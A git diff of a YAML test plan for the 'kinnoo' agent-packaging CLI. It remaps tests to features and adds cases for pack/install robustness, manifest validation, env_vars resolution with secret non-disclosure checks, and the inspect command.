@@ -415,7 +415,6 @@ tests:
     covers:
       - feature: feature3
         ac: AC2
-      - task: task15
     automated: true
     automation_path: tests/test_cli.py::test_run_corrupted_manifest
 
@@ -430,7 +429,6 @@ tests:
     covers:
       - feature: feature3
         ac: AC3
-      - task: task15
     automated: true
     automation_path: tests/test_cli.py::test_run_permission_error
 
@@ -445,7 +443,6 @@ tests:
     covers:
       - feature: feature3
         ac: AC2
-      - task: task15
     automated: false
     automation_path: null
 
@@ -460,7 +457,6 @@ tests:
     covers:
       - feature: feature3
         ac: AC5
-      - task: task15
     automated: false
     automation_path: null
 
@@ -473,7 +469,8 @@ tests:
     expected: Prints error message listing supported frameworks and usage, exits non-zero
     pass_criteria: Error message and usage shown, no files created
     covers:
-      - task: task16
+      - feature: feature4
+        ac: AC1
     automated: true
     automation_path: tests/test_init.py::test_framework_invalid
 
@@ -487,7 +484,8 @@ tests:
     expected: run.py uses google-generativeai, requirements.txt lists google-generativeai, README.md has GOOGLE_API_KEY instructions
     pass_criteria: All files present and correct for Gemini
     covers:
-      - task: task17
+      - feature: feature4
+        ac: AC1
     automated: true
     automation_path: tests/test_init.py::test_framework_templates_generate_correct_files
 
@@ -501,7 +499,8 @@ tests:
     expected: run.py uses openai, requirements.txt lists openai, README.md has OPENAI_API_KEY instructions
     pass_criteria: All files present and correct for ChatGPT
     covers:
-      - task: task17
+      - feature: feature4
+        ac: AC2
     automated: true
     automation_path: tests/test_init.py::test_framework_templates_generate_correct_files
 
@@ -515,7 +514,8 @@ tests:
     expected: run.py uses anthropic, requirements.txt lists anthropic, README.md has ANTHROPIC_API_KEY instructions
     pass_criteria: All files present and correct for Claude
     covers:
-      - task: task17
+      - feature: feature4
+        ac: AC3
     automated: true
     automation_path: tests/test_init.py::test_framework_templates_generate_correct_files
 
@@ -529,7 +529,12 @@ tests:
     expected: kinnoo.yaml passes validation (no errors)
     pass_criteria: is_valid is True and errors is empty for all frameworks
     covers:
-      - task: task18
+      - feature: feature4
+        ac: AC1
+      - feature: feature4
+        ac: AC2
+      - feature: feature4
+        ac: AC3
     automated: true
     automation_path: tests/test_init.py::test_framework_manifests_pass_validation
 
@@ -542,7 +547,8 @@ tests:
     expected: Prints usage message and exits non-zero
     pass_criteria: Usage message shown, no files created
     covers:
-      - task: task19
+      - feature: feature2
+        ac: AC5
     automated: true
     automation_path: tests/test_init.py::test_init_missing_name_prints_usage
 
@@ -555,7 +561,8 @@ tests:
     expected: Prints error and does not overwrite directory
     pass_criteria: Error message shown, directory unchanged
     covers:
-      - task: task19
+      - feature: feature2
+        ac: AC6
     automated: true
     automation_path: tests/test_init.py::test_init_existing_directory_fails
 
@@ -569,7 +576,8 @@ tests:
     expected: requirements.txt is empty, README.md has no API key, run.py is hello-world
     pass_criteria: All vanilla agent files present and correct
     covers:
-      - task: task19
+      - feature: feature2
+        ac: AC1
     automated: true
     automation_path: tests/test_init.py::test_init_vanilla_agent
 
@@ -582,7 +590,12 @@ tests:
     expected: Succeeds and generates correct files
     pass_criteria: Exit code 0, files created for each framework
     covers:
-      - task: task16
+      - feature: feature4
+        ac: AC1
+      - feature: feature4
+        ac: AC2
+      - feature: feature4
+        ac: AC3
     automated: true
     automation_path: tests/test_init.py::test_framework_valid
 
@@ -596,7 +609,8 @@ tests:
     expected: kinnoo.yaml passes validation (no errors)
     pass_criteria: is_valid is True and errors is empty
     covers:
-      - task: task18
+      - feature: feature2
+        ac: AC2
     automated: true
     automation_path: tests/test_init.py::test_generated_manifest_passes_validation
 
@@ -610,7 +624,8 @@ tests:
     expected: kinnoo.yaml passes validation (no errors)
     pass_criteria: is_valid is True and errors is empty
     covers:
-      - task: task21
+      - feature: feature4
+        ac: AC1
     automated: true
     automation_path: tests/test_init.py::test_agent_name_with_underscore_is_accepted
 
@@ -626,7 +641,6 @@ tests:
     covers:
       - feature: feature4
         ac: AC5
-      - task: task22
     automated: true
     automation_path: tests/test_init.py::test_gemini_template_uses_genai_and_flash_lite
 
@@ -641,7 +655,6 @@ tests:
     covers:
       - feature: feature5
         ac: AC5
-      - task: task23
     automated: true
     automation_path: tests/test_pack.py::test_pack_missing_argument_prints_usage
 
@@ -656,7 +669,6 @@ tests:
     covers:
       - feature: feature5
         ac: AC6
-      - task: task24
     automated: true
     automation_path: tests/test_pack.py::test_pack_invalid_manifest_aborts
 
@@ -671,7 +683,6 @@ tests:
     covers:
       - feature: feature5
         ac: AC6
-      - task: task25
     automated: true
     automation_path: tests/test_pack.py::test_pack_missing_required_files_aborts
 
@@ -687,7 +698,6 @@ tests:
     covers:
       - feature: feature5
         ac: AC3
-      - task: task26
     automated: true
     automation_path: tests/test_pack.py::test_pack_includes_wheel_files
 
@@ -707,7 +717,6 @@ tests:
         ac: AC2
       - feature: feature5
         ac: AC4
-      - task: task27
     automated: true
     automation_path: tests/test_pack.py::test_pack_creates_correct_archive_structure
 
@@ -723,7 +732,6 @@ tests:
     covers:
       - feature: feature5
         ac: AC7
-      - task: task28
     automated: true
     automation_path: tests/test_pack.py::test_pack_install_compatibility
     notes: This test is deprecated; kinnoo install will be tested as part of feature5 integration.
@@ -746,7 +754,6 @@ tests:
         ac: AC3
       - feature: feature5
         ac: AC4
-      - task: task29
     automated: true
     automation_path: tests/test_pack.py::test_pack_positive_cases
 
@@ -762,7 +769,6 @@ tests:
     covers:
       - feature: feature5
         ac: AC6
-      - task: task29
     automated: true
     automation_path: tests/test_pack.py::test_pack_negative_cases
 
@@ -778,7 +784,6 @@ tests:
     covers:
       - feature: feature5
         ac: AC7
-      - task: task29
     automated: true
     automation_path: tests/test_pack.py::test_pack_integration_workflow
 
@@ -794,7 +799,6 @@ tests:
     covers:
       - feature: feature5
         ac: AC8
-      - task: task23
     automated: true
     automation_path: tests/test_pack.py::test_pack_inside_agent_dir_prints_error
 
@@ -815,7 +819,6 @@ tests:
         ac: AC2
       - feature: feature5
         ac: AC4
-      - task: task28
     automated: true
     automation_path: tests/test_pack.py::test_manual_extraction_verifies_files
 
@@ -832,7 +835,6 @@ tests:
     covers:
       - feature: feature6
         ac: AC5
-      - task: task29
 
   - id: test52
     title: kinnoo install extracts archive to new directory with collision handling
@@ -848,7 +850,6 @@ tests:
     covers:
       - feature: feature6
         ac: AC1
-      - task: task30
 
   - id: test53
     title: kinnoo install validates manifest before installation
@@ -863,7 +864,6 @@ tests:
     covers:
       - feature: feature6
         ac: AC2
-      - task: task31
 
   - id: test54
     title: kinnoo install creates venv and installs dependencies from wheels
@@ -879,7 +879,6 @@ tests:
     covers:
       - feature: feature6
         ac: AC3
-      - task: task32
 
   - id: test55
     title: kinnoo install makes agent runnable with kinnoo run
@@ -895,7 +894,6 @@ tests:
     covers:
       - feature: feature6
         ac: AC4
-      - task: task33
 
   - id: test56
     title: kinnoo install handles invalid archive or missing files gracefully
@@ -910,7 +908,6 @@ tests:
     covers:
       - feature: feature6
         ac: AC6
-      - task: task34
 
   - id: test57
     title: kinnoo install prevents overwrites unless --force flag is provided
@@ -926,7 +923,6 @@ tests:
     covers:
       - feature: feature6
         ac: AC7
-      - task: task35
 
   - id: test58
     title: kinnoo install extracts archive to user-specified directory
@@ -944,7 +940,6 @@ tests:
     covers:
       - feature: feature6
         ac: AC1
-      - task: task36
 
   - id: test59
     title: Manifest loader injects defaults for missing dependencies, inputs, outputs
@@ -953,7 +948,7 @@ tests:
     steps:
       - Load kinnoo.yaml with missing fields
       - Call manifest loader
-      - Check that manifest contains dependencies: [], inputs: {type: string}, outputs: {type: string}
+      - "Check that manifest contains dependencies: [], inputs: {type: string}, outputs: {type: string}"
     expected: Manifest dict has injected defaults
     pass_criteria: All missing fields are filled with defaults
     automated: true
@@ -961,7 +956,6 @@ tests:
     covers:
       - feature: feature6
         ac: AC8
-      - task: task37
   
   - id: test60
     title: Manifest loader normalizes "type" field to list
@@ -977,6 +971,1842 @@ tests:
     pass_criteria: All variations normalized to list
     automated: true
     automation_path: tests/test_validator.py
+    covers:
       - feature: feature6
         ac: AC8
-      - task: task38    
+
+  - id: test61
+    title: Install command is modularized and delegated from CLI
+    type: unit
+    preconditions: Kinnoo source tree contains cli.py and install_command.py
+    steps:
+      - step1: Inspect src/kinnoo/install_command.py and confirm install command entry function exists
+      - step2: Inspect src/kinnoo/cli.py and confirm install path delegates to install_command module instead of inline install logic
+      - step3: Run kinnoo install on a valid archive and verify behavior remains consistent
+    expected: Install flow is implemented in install_command.py and invoked by cli.py delegation
+    pass_criteria: No inline duplicated install flow remains in cli.py; install behavior still succeeds for valid archive
+    automated: true
+    automation_path: tests/test_cli_install.py::test_install_delegates_to_install_command
+    covers:
+      - feature: feature7
+        ac: AC1
+      - feature: feature7
+        ac: AC2
+
+  - id: test62
+    title: Global --version prints package version and exits successfully
+    type: unit
+    preconditions: kinnoo CLI installed and importable in active environment
+    steps:
+      - step1: Run kinnoo --version
+      - step2: Capture stdout and process exit code
+    expected: CLI prints package version and exits with code 0
+    pass_criteria: Output contains semantic version string and process exit code is 0
+    automated: true
+    automation_path: tests/test_cli.py::test_cli_version_flag
+    covers:
+      - feature: feature7
+        ac: AC3
+
+  - id: test63
+    title: Test suite contains no duplicate test function names
+    type: unit
+    preconditions: Test files are present under tests/
+    steps:
+      - step1: Collect pytest tests from tests/ directory
+      - step2: Detect duplicate test function names and duplicate collected node ids
+    expected: No duplicate function names or duplicate collection targets are present
+    pass_criteria: Duplicate detection returns zero duplicates
+    automated: true
+    automation_path: tests/test_suite_integrity.py::test_no_duplicate_test_functions
+    covers:
+      - feature: feature7
+        ac: AC4
+
+  - id: test64
+    title: V1 regression suite passes after CLI modular refactor
+    type: integration
+    preconditions: Project dependencies installed and test environment available
+    steps:
+      - step1: Run python3 -m pytest for V1-related test modules
+      - step2: Review failures and confirm no regressions introduced by feature7 changes
+    expected: Existing V1 tests pass after refactor and CLI version flag additions
+    pass_criteria: pytest exits with code 0 for V1 test scope
+    automated: true
+    automation_path: tests/test_regression_v1.py::test_v1_suite_passes_after_feature7
+    covers:
+      - feature: feature7
+        ac: AC5
+
+  - id: test65
+    title: Pack bundles transitive dependency wheels from pinned requirements
+    type: integration
+    preconditions: |
+      Agent fixture requirements.txt includes pinned direct dependencies with transitive trees:
+      requests==2.31.0
+      httpx==0.27.0
+    steps:
+      - step1: Run kinnoo pack on the fixture agent
+      - step2: Inspect the .kno archive wheel directory contents
+      - step3: Verify wheels exist for direct dependencies and representative transitives (e.g., urllib3, certifi, httpcore, anyio)
+    expected: Archive contains wheel artifacts for both direct and transitive dependencies required for offline install
+    pass_criteria: Wheel set includes transitive dependencies and offline install does not require network for this fixture
+    automated: true
+    automation_path: tests/test_pack_robustness.py::test_pack_includes_transitive_wheels_for_pinned_deps
+    covers:
+      - feature: feature8
+        ac: AC1
+
+  - id: test66
+    title: .kno artifacts use zip format consistently across pack and install
+    type: integration
+    preconditions: Valid agent fixture with pinned requirements and kinnoo CLI available
+    steps:
+      - step1: Run kinnoo pack and verify produced .kno file is a zip archive
+      - step2: Run kinnoo install on the produced archive and verify extraction/install succeeds
+      - step3: Confirm CLI/help/docs references for archive behavior are zip-consistent in tested paths
+    expected: Pack/install behavior and user-visible references are aligned to zip-based .kno format
+    pass_criteria: Archive magic/type indicates zip and install path succeeds without tar-specific assumptions
+    automated: true
+    automation_path: tests/test_pack_robustness.py::test_kno_zip_format_is_canonical
+    covers:
+      - feature: feature8
+        ac: AC2
+
+  - id: test67
+    title: Pack warns and continues when individual wheel builds fail
+    type: integration
+    preconditions: |
+      Agent fixture requirements.txt includes at least one intentionally problematic pinned dependency alongside valid ones, e.g.:
+      requests==2.31.0
+      nonexist-pkg-kinnoo-test==0.0.1
+    steps:
+      - step1: Run kinnoo pack on the fixture agent
+      - step2: Capture stdout/stderr warnings and resulting archive path
+      - step3: Verify archive is still created and warning identifies failed dependency wheel build
+    expected: Packaging continues with warnings instead of aborting when one dependency wheel cannot be produced
+    pass_criteria: Process exits success for pack, warning is emitted, and output archive exists
+    automated: true
+    automation_path: tests/test_pack_robustness.py::test_pack_continues_on_per_dependency_wheel_failure
+    covers:
+      - feature: feature8
+        ac: AC3
+
+  - id: test68
+    title: Install falls back to PyPI for missing wheels with explicit warning
+    type: integration
+    preconditions: |
+      Archive built from pinned dependency fixture where one required wheel is deliberately removed before install,
+      e.g., requirements include requests==2.31.0 and urllib3 wheel is removed from archive wheel bundle.
+    steps:
+      - step1: Run kinnoo install on the modified archive with network available
+      - step2: Capture install output for fallback warning
+      - step3: Verify missing dependency is installed via PyPI and agent remains runnable
+    expected: Installer warns about missing wheels and successfully resolves missing dependency from PyPI
+    pass_criteria: Warning is printed, install exits 0, and runtime imports for missing dependency succeed
+    automated: true
+    automation_path: tests/test_cli_install.py::test_install_falls_back_to_pypi_when_wheel_missing
+    covers:
+      - feature: feature8
+        ac: AC4
+
+  - id: test69
+    title: Fully offline install succeeds when pinned transitive wheels are complete
+    type: integration
+    preconditions: |
+      Archive produced from fixture with pinned direct dependencies that have transitives:
+      requests==2.31.0
+      httpx==0.27.0
+      and all required wheels bundled.
+    steps:
+      - step1: Run kinnoo install in an isolated environment with network access disabled
+      - step2: Execute kinnoo run against installed agent
+      - step3: Verify no network fallback path is attempted during install
+    expected: Offline installation and execution succeed using bundled wheels only
+    pass_criteria: Install and run exit 0 with network disabled and no PyPI fallback warning
+    automated: true
+    automation_path: tests/test_cli_install.py::test_install_offline_succeeds_with_complete_wheels
+    covers:
+      - feature: feature8
+        ac: AC5
+
+  - id: test70
+    title: Pack warns when platform-specific wheels are included
+    type: unit
+    preconditions: |
+      Fixture dependency set includes a pinned package that commonly ships platform-specific wheels,
+      e.g., orjson==3.10.6.
+    steps:
+      - step1: Run kinnoo pack for fixture agent
+      - step2: Inspect emitted warnings for platform portability message
+      - step3: Confirm archive creation still succeeds
+    expected: CLI prints the platform-specific wheel portability warning and still completes packaging
+    pass_criteria: Warning text is present and .kno artifact is generated successfully
+    automated: true
+    automation_path: tests/test_pack_robustness.py::test_pack_warns_on_platform_specific_wheels
+    covers:
+      - feature: feature8
+        ac: AC6
+
+  - id: test71
+    title: Optional metadata fields are accepted when present or absent
+    type: unit
+    preconditions: validator module available; manifest fixtures with and without description/author/license
+    steps:
+      - step1: Validate a V2 manifest containing description, author, and license as strings
+      - step2: Validate a manifest omitting those optional fields entirely
+    expected: Both manifests validate successfully
+    pass_criteria: validate() returns is_valid=True with no errors for both fixtures
+    automated: true
+    automation_path: tests/test_validator.py::test_feature9_optional_string_fields_are_accepted
+    covers:
+      - feature: feature9
+        ac: AC1
+
+  - id: test72
+    title: env_vars optional list of strings is accepted
+    type: unit
+    preconditions: validator module available; manifest fixture with env_vars as list[str]
+    steps:
+      - step1: Create manifest with env_vars populated as a list of valid variable names
+      - step2: Run validator on the manifest
+    expected: Manifest validates successfully when env_vars is list[str]
+    pass_criteria: validate() returns is_valid=True and errors=[] for valid env_vars list
+    automated: true
+    automation_path: tests/test_validator.py::test_feature9_env_vars_list_of_strings_is_accepted
+    covers:
+      - feature: feature9
+        ac: AC2
+
+  - id: test73
+    title: Existing V1 manifests remain valid under V2 extensions
+    type: unit
+    preconditions: validator module available; V1 fixture manifest with no new feature9 fields
+    steps:
+      - step1: Validate a V1 manifest that does not include description/author/license/env_vars
+      - step2: Inspect validator result
+    expected: V1 manifest still passes validation unchanged
+    pass_criteria: validate() returns is_valid=True and no feature9-related errors
+    automated: true
+    automation_path: tests/test_validator.py::test_feature9_v1_manifest_compatibility
+    covers:
+      - feature: feature9
+        ac: AC3
+
+  - id: test74
+    title: Invalid optional field types produce specific field-level errors
+    type: unit
+    preconditions: validator module available; fixtures with invalid description/author/license/env_vars types
+    steps:
+      - step1: Validate manifest where description is non-string and env_vars is non-list
+      - step2: Validate manifest where env_vars contains non-string items
+      - step3: Inspect collected error messages
+    expected: Validation fails with specific errors naming each invalid field and expected type
+    pass_criteria: validate() returns is_valid=False and errors mention field names with expected type requirements
+    automated: true
+    automation_path: tests/test_validator.py::test_feature9_invalid_optional_field_types_are_rejected
+    covers:
+      - feature: feature9
+        ac: AC4
+
+  - id: test75
+    title: Init-generated manifest includes description and author placeholders
+    type: integration
+    preconditions: kinnoo CLI installed; init template generation enabled
+    steps:
+      - step1: Run kinnoo init for a new agent directory
+      - step2: Open generated kinnoo.yaml
+      - step3: Verify description and author placeholder fields are present
+    expected: Generated manifest includes description and author placeholder entries
+    pass_criteria: kinnoo.yaml contains both fields with non-empty placeholder values
+    automated: true
+    automation_path: tests/test_init.py::test_feature9_init_manifest_includes_description_and_author
+    covers:
+      - feature: feature9
+        ac: AC5
+
+  - id: test76
+    title: env_vars entries must be non-empty strings
+    type: unit
+    preconditions: validator module available; manifest fixture with empty string in env_vars list
+    steps:
+      - step1: Validate manifest with env_vars containing at least one empty string item
+      - step2: Inspect validation output
+    expected: Validator rejects manifest and reports env_vars item constraint violation
+    pass_criteria: validate() returns is_valid=False and errors include env_vars non-empty string requirement
+    automated: true
+    automation_path: tests/test_validator.py::test_feature9_env_vars_items_must_be_non_empty_strings
+    covers:
+      - feature: feature9
+        ac: AC6
+
+  - id: test77
+    title: Manifest schema docs include feature9 optional fields and env_vars constraints
+    type: unit
+    preconditions: documentation files exist and are readable
+    steps:
+      - step1: Inspect docs/manifest-schema-reference.md for description, author, license, and env_vars
+      - step2: Verify env_vars list[string] and non-empty item constraints are documented
+      - step3: Verify docs state V1 manifests remain valid
+    expected: Documentation reflects implemented feature9 schema semantics
+    pass_criteria: Required field descriptions and compatibility notes are present in schema docs
+    automated: true
+    automation_path: tests/test_docs.py::test_feature9_schema_docs_cover_optional_fields_and_constraints
+    covers:
+      - feature: feature9
+        ac: AC2
+
+  - id: test78
+    title: Declared env_vars resolve from current environment first
+    type: integration
+    preconditions: kinnoo CLI installed; manifest declares env_vars; required vars set in process environment
+    steps:
+      - step1: Create agent manifest with env_vars list and set matching variables in current environment
+      - step2: Run kinnoo run for the agent
+      - step3: Verify agent subprocess receives declared variables from process environment
+    expected: Agent executes successfully with declared env_vars sourced from current environment
+    pass_criteria: Exit code is 0 and subprocess observes expected env var names as present
+    automated: true
+    automation_path: tests/test_cli_env_vars.py::test_env_vars_resolve_from_process_environment
+    covers:
+      - feature: feature10
+        ac: AC1
+
+  - id: test79
+    title: Missing env_vars fall back to agent .env file
+    type: integration
+    preconditions: kinnoo CLI installed; manifest declares env_vars; env vars absent from process environment; agent has .env file
+    steps:
+      - step1: Create agent with declared env_vars and no matching process environment values
+      - step2: Provide matching values in agent-local .env file
+      - step3: Run kinnoo run and verify declared env var names are resolved
+    expected: Runtime loads missing declared env vars from .env and proceeds
+    pass_criteria: Run succeeds and subprocess receives declared variables resolved from .env
+    automated: true
+    automation_path: tests/test_cli_env_vars.py::test_env_vars_fallback_to_dotenv
+    covers:
+      - feature: feature10
+        ac: AC2
+
+  - id: test80
+    title: Missing env_vars trigger masked interactive prompt
+    type: integration
+    preconditions: kinnoo CLI installed; declared env_vars unresolved in environment and .env; interactive input simulation available
+    steps:
+      - step1: Run kinnoo run where one declared env var remains unresolved after env and .env checks
+      - step2: Simulate interactive input for the missing variable via masked prompt path
+      - step3: Verify execution continues without echoing secret value to terminal output
+    expected: Runtime prompts for missing variable using masked input and continues on provided value
+    pass_criteria: Prompt path is invoked, value is accepted, and no secret value appears in stdout/stderr
+    automated: true
+    automation_path: tests/test_cli_env_vars.py::test_missing_env_var_uses_masked_prompt
+    covers:
+      - feature: feature10
+        ac: AC3
+
+  - id: test81
+    title: Resolved env_vars are injected into entrypoint subprocess environment
+    type: integration
+    preconditions: kinnoo CLI installed; declared env_vars resolved through environment/.env/prompt paths
+    steps:
+      - step1: Run kinnoo run on agent that inspects declared env var names in subprocess
+      - step2: Verify subprocess sees all declared resolved variables
+    expected: Runtime injects resolved env vars into subprocess environment for execution
+    pass_criteria: Entry point confirms presence of declared env var names and exits successfully
+    automated: true
+    automation_path: tests/test_cli_env_vars.py::test_resolved_env_vars_injected_into_subprocess
+    covers:
+      - feature: feature10
+        ac: AC4
+
+  - id: test82
+    title: Prompt cancellation aborts run with missing-variable message
+    type: integration
+    preconditions: kinnoo CLI installed; declared env_vars unresolved after environment and .env checks; interactive cancel simulation available
+    steps:
+      - step1: Run kinnoo run and trigger unresolved env var prompt
+      - step2: Simulate user cancellation (e.g., Ctrl+C / EOF)
+      - step3: Inspect error output
+    expected: Execution aborts with clear message naming missing variable and no secret value disclosure
+    pass_criteria: Non-zero exit code, message includes variable name, and secret value is not present in output
+    automated: true
+    automation_path: tests/test_cli_env_vars.py::test_prompt_cancel_aborts_with_missing_var_name
+    covers:
+      - feature: feature10
+        ac: AC5
+
+  - id: test83
+    title: Agents without env_vars remain unaffected
+    type: integration
+    preconditions: kinnoo CLI installed; manifest omits env_vars
+    steps:
+      - step1: Run kinnoo run on agent manifest without env_vars
+      - step2: Verify no .env loading or prompt logic is invoked
+      - step3: Verify runtime behavior matches baseline V1 flow
+    expected: Agent runs with unchanged behavior and no env-var resolution side effects
+    pass_criteria: Run succeeds without env-var prompts/checks and output matches baseline behavior
+    automated: true
+    automation_path: tests/test_cli_env_vars.py::test_agents_without_env_vars_unaffected
+    covers:
+      - feature: feature10
+        ac: AC6
+
+  - id: test84
+    title: Secret values are never printed or logged in env_vars flows
+    type: integration
+    preconditions: kinnoo CLI installed; test secret sentinel values provided via env/.env/prompt paths
+    steps:
+      - step1: Execute env_vars resolution paths using unique sentinel secret values
+      - step2: Capture stdout/stderr and inspect any runtime log artifacts
+      - step3: Assert only variable names may appear while secret values never appear
+    expected: No code path outputs or logs actual secret values during env_vars handling
+    pass_criteria: Sentinel secret values are absent from terminal output and log files across all env_vars resolution paths
+    automated: true
+    automation_path: tests/test_cli_env_vars.py::test_secret_values_never_appear_in_output_or_logs
+    covers:
+      - feature: feature10
+        ac: AC7
+
+  - id: test85
+    title: Docs describe env_vars security and non-disclosure invariant
+    type: unit
+    preconditions: docs are present and readable
+    steps:
+      - step1: Inspect README and manifest schema docs for env_vars resolution order
+      - step2: Verify docs explicitly state secret values must never be printed or logged
+      - step3: Verify examples reference variable names only
+    expected: Documentation reflects secure env_vars handling contract and operator guidance
+    pass_criteria: Required security guidance and non-disclosure language are present in docs
+    automated: true
+    automation_path: tests/test_docs.py::test_feature10_docs_cover_env_vars_security_contract
+    covers:
+      - feature: feature10
+        ac: AC7
+
+  - id: test86
+    title: Process environment value wins over .env for same declared variable
+    type: integration
+    preconditions: kinnoo CLI installed; manifest declares env_vars; same variable present in process env and agent-local .env with different sentinel values
+    steps:
+      - step1: Configure declared env var with sentinel A in process environment and sentinel B in .env
+      - step2: Run kinnoo run and inspect subprocess-observed value via test entrypoint
+      - step3: Verify selected value matches process environment and no secret value is echoed in output
+    expected: Runtime resolution order honors process environment before .env for matching declared variable names
+    pass_criteria: Subprocess receives process environment value; fallback .env value is ignored for selection
+    automated: true
+    automation_path: tests/test_cli_env_vars.py::test_env_precedence_prefers_process_env_over_dotenv
+    covers:
+      - feature: feature10
+        ac: AC1
+      - feature: feature10
+        ac: AC2
+
+  - id: test87
+    title: Mixed-source env_vars resolve and inject in one run
+    type: integration
+    preconditions: kinnoo CLI installed; manifest declares multiple env_vars; fixture supports environment + .env + prompt sources
+    steps:
+      - step1: Provide one variable in process env, one in .env, and one via mocked masked prompt
+      - step2: Run kinnoo run and assert subprocess observes all declared variables as resolved
+      - step3: Verify execution succeeds and no secret values appear in stdout/stderr
+    expected: Runtime supports deterministic per-variable mixed-source resolution and injects all resolved values to subprocess
+    pass_criteria: Run exits 0; subprocess confirms all variables; output contains no secret sentinel values
+    automated: true
+    automation_path: tests/test_cli_env_vars.py::test_mixed_source_env_var_resolution_and_injection
+    covers:
+      - feature: feature10
+        ac: AC3
+      - feature: feature10
+        ac: AC4
+
+  - id: test88
+    title: Sentinel secrets do not appear in runtime artifact files
+    type: integration
+    preconditions: kinnoo CLI installed; feature10 env resolution exercised with sentinel secret values; test fixture captures runtime artifact files touched during execution
+    steps:
+      - step1: Execute env/.env/prompt env_vars flows using unique sentinel values
+      - step2: Collect candidate runtime artifact files created or touched by run flow
+      - step3: Assert sentinel values are absent from all inspected artifact file contents and terminal output
+    expected: No secret sentinel value is persisted to runtime artifact files or terminal streams
+    pass_criteria: Negative sentinel checks pass across captured stdout/stderr and inspected runtime files
+    automated: true
+    automation_path: tests/test_cli_env_vars.py::test_secret_sentinels_absent_from_runtime_artifacts
+    covers:
+      - feature: feature10
+        ac: AC7
+
+  - id: test89
+    title: kinnoo inspect without target prints usage help
+    type: unit
+    preconditions: kinnoo CLI installed
+    steps:
+      - step1: Run `kinnoo inspect` with no target argument
+      - step2: Capture stdout/stderr and exit code
+    expected: Usage/help guidance is shown and command exits non-zero
+    pass_criteria: Output includes inspect usage text and process exits non-zero
+    automated: true
+    automation_path: tests/test_cli_inspect.py::test_inspect_missing_target_prints_usage
+    covers:
+      - feature: feature11
+        ac: AC6
+
+  - id: test90
+    title: Inspect directory with missing manifest or requirements prints guidance and exits gracefully
+    type: integration
+    preconditions: kinnoo CLI installed; temp agent directories that omit `kinnoo.yaml` or `requirements.txt`
+    steps:
+      - step1: Run `kinnoo inspect <agent-dir>` where `kinnoo.yaml` is missing
+      - step2: Verify stdout guidance mentions creating `kinnoo.yaml` and includes minimal manifest example
+      - step3: Run `kinnoo inspect <agent-dir>` where `requirements.txt` is missing
+      - step4: Verify stdout guidance mentions creating `requirements.txt` and includes `pip install uv` and `uv export --format requirements-txt > requirements.txt`
+    expected: Inspect exits gracefully with clear stdout guidance for each missing-file scenario
+    pass_criteria: Both scenarios return non-zero without traceback and include required guidance content
+    automated: true
+    automation_path: tests/test_cli_inspect.py::test_inspect_missing_required_files_prints_guidance
+    covers:
+      - feature: feature11
+        ac: AC7
+      - feature: feature11
+        ac: AC8
+
+  - id: test91
+    title: Inspect reads manifest from .kno zip without full extraction
+    type: integration
+    preconditions: kinnoo CLI installed; valid `.kno` archive fixture with `kinnoo.yaml`
+    steps:
+      - step1: Run `kinnoo inspect <archive.kno>`
+      - step2: Verify inspect output includes expected manifest metadata fields
+      - step3: Verify no extracted agent directory artifacts are created on disk by inspect flow
+    expected: Manifest metadata is read directly from archive and displayed without full extraction
+    pass_criteria: Inspect exits 0, prints expected metadata, and leaves no full extraction artifacts
+    automated: true
+    automation_path: tests/test_cli_inspect.py::test_inspect_reads_manifest_from_archive_without_extracting
+    covers:
+      - feature: feature11
+        ac: AC2
+
+  - id: test92
+    title: Inspect output is human-readable, omits missing optional fields, and surfaces validator field errors
+    type: integration
+    preconditions: kinnoo CLI installed; fixtures for valid manifest with missing optional fields and invalid manifest missing required fields
+    steps:
+      - step1: Run `kinnoo inspect <agent-dir>` on valid fixture with optional fields omitted
+      - step2: Verify output is formatted human-readable text and excludes omitted optional fields
+      - step3: Run `kinnoo inspect <agent-dir>` on fixture where required fields are missing in `kinnoo.yaml`
+      - step4: Verify error output names missing required fields using validator messages
+    expected: Inspect formatting and validation behavior match feature11 requirements
+    pass_criteria: Human-readable output is produced for valid fixture; invalid fixture exits non-zero with field-specific missing-field errors
+    automated: true
+    automation_path: tests/test_cli_inspect.py::test_inspect_formatting_optional_omission_and_missing_required_field_errors
+    covers:
+      - feature: feature11
+        ac: AC1
+      - feature: feature11
+        ac: AC3
+      - feature: feature11
+        ac: AC4
+      - feature: feature11
+        ac: AC5
+      - feature: feature11
+        ac: AC9
+
+  - id: test93
+    title: Inspect displays env var names only and never secret values
+    type: unit
+    preconditions: kinnoo CLI installed; manifest fixture includes env_vars names and environment contains sentinel secret values
+    steps:
+      - step1: Run `kinnoo inspect <agent-dir>` on manifest declaring env_vars names
+      - step2: Capture output and verify env var names appear as metadata
+      - step3: Verify no environment variable values or sentinel secrets appear in output
+    expected: Inspect remains metadata-only and names-only for env var display
+    pass_criteria: Output includes declared env var names and excludes all env var values
+    automated: true
+    automation_path: tests/test_cli_inspect.py::test_inspect_shows_env_var_names_not_values
+    covers:
+      - feature: feature11
+        ac: AC1
+
+  - id: test94
+    title: Docs cover inspect usage and missing-file guidance
+    type: unit
+    preconditions: README.md and docs/manifest-schema-reference.md are present
+    steps:
+      - step1: Verify docs include `kinnoo inspect` examples for directory and `.kno` archive targets
+      - step2: Verify docs include missing `kinnoo.yaml` and missing `requirements.txt` guidance
+      - step3: Verify docs include robust requirements generation commands with `uv export --format requirements-txt`
+    expected: Documentation reflects inspect command behavior and operator guidance
+    pass_criteria: Required inspect usage and missing-file guidance content appears in docs
+    automated: true
+    automation_path: tests/test_docs.py::test_feature11_docs_cover_inspect_usage_and_missing_file_guidance
+    covers: []
+
+  - id: test95
+    title: Missing-manifest guidance uses centralized minimal template with agent maintenance note
+    type: unit
+    preconditions: inspect/template modules are present and readable
+    steps:
+      - step1: Inspect source to confirm minimal `kinnoo.yaml` guidance template is defined in a single reusable location
+      - step2: Verify source includes explicit `[agent]` maintenance note instructing updates when schema/template changes affect minimal manifest fields
+      - step3: Run missing-`kinnoo.yaml` inspect path and verify guidance renders the centralized minimal template text
+    expected: Missing-manifest guidance remains maintainable and aligned with centralized template source
+    pass_criteria: Single-source template + `[agent]` maintenance note exists and runtime guidance output uses that source
+    automated: true
+    automation_path: tests/test_cli_inspect.py::test_missing_manifest_guidance_uses_centralized_template_with_agent_note
+    covers:
+      - feature: feature11
+        ac: AC7
+
+  - id: test96
+    title: Registry abstraction exposes backend contract and local backend layout
+    type: deprecated
+    preconditions: Registry modules are importable; local filesystem sandbox available
+    steps:
+      - step1: Inspect registry abstraction to confirm publish/resolve/list/search operations are defined behind a backend contract
+      - step2: Initialize local backend with a sandbox root and perform representative no-op or fixture-backed calls
+      - step3: Verify backend path conventions follow `~/.kinnoo/registry/<name>/<version>/` semantics
